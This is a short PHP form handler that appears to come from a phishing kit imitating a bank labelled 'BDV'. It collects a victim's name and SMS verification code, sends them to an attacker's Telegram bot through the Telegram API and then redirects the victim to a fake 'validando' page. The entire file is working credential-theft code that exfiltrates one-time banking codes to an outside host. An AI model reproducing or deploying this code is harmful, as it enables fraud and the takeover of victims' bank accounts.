<?php
// Configuración de Telegram
require 'config.php';

// Obtener el código SMS del formulario
$sms = isset($_POST['sms']) ? $_POST['sms'] : '';
$nombre = isset($_POST['nombre']) ? $_POST['nombre'] : ''; // En caso de que guardes el nombre

// Componer el mensaje para enviar a Telegram
$message = "BDV📲 \n👤Nombre: " . $nombre;
$message .= "\n💬SMS: " . $sms;

// Enviar el mensaje a Telegram usando file_get_contents
$telegramApiUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);
$response = file_get_contents($telegramApiUrl);

// Redirigir después de enviar los datos
header('Location: validando.html');
exit();
?>
